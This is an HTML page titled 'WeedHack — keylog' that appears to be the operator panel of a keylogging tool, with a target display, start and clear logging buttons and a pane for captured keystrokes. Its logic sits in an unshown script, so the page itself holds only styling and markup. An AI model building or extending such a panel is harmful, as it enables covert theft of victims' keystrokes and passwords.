<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WeedHack — keylog</title>
<link rel="stylesheet" href="/css/style.css">
<style>
  html, body { height: 100%; background: #000; }
  .wrap { height: 100vh; display: flex; flex-direction: column; }
  .topbar {
    display: flex; align-items: center; gap: 10px;
    padding: 12px 20px; flex-shrink: 0;
    background: #000;
    border-bottom: 1px solid var(--line);
    font-size: 12px; color: var(--muted);
  }
  .topbar .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--red); }
  .topbar .dot.on { background: var(--green); box-shadow: 0 0 12px var(--green); }
  .topbar .target { color: var(--text); font-family: var(--mono); }
  .topbar .spacer { flex: 1; }
  .topbar button {
    margin: 0; padding: 8px 16px; font-size: 11px; font-weight: 600; width: auto;
    background: transparent; border: 1px solid var(--line-2); color: var(--text);
    border-radius: var(--r-pill); cursor: pointer; font-family: inherit; box-shadow: none;
  }
  .topbar button:hover { border-color: var(--accent); color: var(--accent); }
  .topbar button.on {
    background: linear-gradient(135deg, var(--accent), var(--accent-2));
    border-color: transparent; color: #000;
    box-shadow: 0 4px 20px rgba(79,195,247,.4);
  }
  .log {
    flex: 1; overflow-y: auto;
    padding: 20px 24px;
    font-family: var(--mono); font-size: 13px; line-height: 1.65;
    color: var(--text);
    background: #000;
    white-space: pre-wrap; word-break: break-word;
    background-image:
      linear-gradient(rgba(79,195,247,.02) 1px, transparent 1px),
      linear-gradient(90deg, rgba(79,195,247,.02) 1px, transparent 1px);
    background-size: 24px 24px;
  }
  .log .t { color: var(--accent); font-size: 11px; font-weight: 600; }
  .log .chunk {
    margin-bottom: 10px;
    padding: 10px 14px;
    background: #05050a;
    border: 1px solid var(--line);
    border-left: 3px solid var(--line-2);
    border-radius: var(--r-md);
    transition: border-left-color .15s;
  }
  .log .chunk:hover { border-left-color: var(--accent); }
</style>
</head>
<body>
<div class="wrap">
  <div class="topbar">
    <span class="dot" id="dot"></span>
    <span class="target" id="target">—</span>
    <span class="spacer"></span>
    <button id="toggle">start logging</button>
    <button id="clear">clear log</button>
    <button id="close">close</button>
  </div>
  <div class="log" id="log"></div>
</div>
<script src="/js/keylog.js"></script>
</body>
</html>
